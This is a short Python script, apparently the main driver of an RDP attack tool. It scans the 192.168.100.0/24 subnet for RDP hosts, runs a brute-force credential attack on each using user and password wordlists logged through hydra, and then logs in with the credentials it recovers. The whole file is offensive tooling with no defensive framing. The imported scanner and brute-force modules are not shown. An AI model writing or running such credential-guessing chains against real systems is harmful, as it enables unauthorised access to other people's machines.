from scanner import scan_network
from brute_force import brute_force_rdp
from connect_rdp import connect_rdp

# Step 1: Scanning the network for active RDP hosts...
print("\nStep 1: Scanning network...")
ip_targets = scan_network('192.168.100.0/24')
if not ip_targets:
    print("No active RDP hosts found.")

# Step 2: Brute force attack on each IP with RDP active
for ip in ip_targets:
    print(f"\nStep 2: Brute force attack on {ip}...")
    brute_force_rdp(ip, 'user.txt', 'pass.txt', 'hydra_rdp.log')

# Step 3: Attempting connection with valid credentials
print("\nStep 3: Attempting connection with valid credentials...")
connect_rdp('hydra_rdp.log')
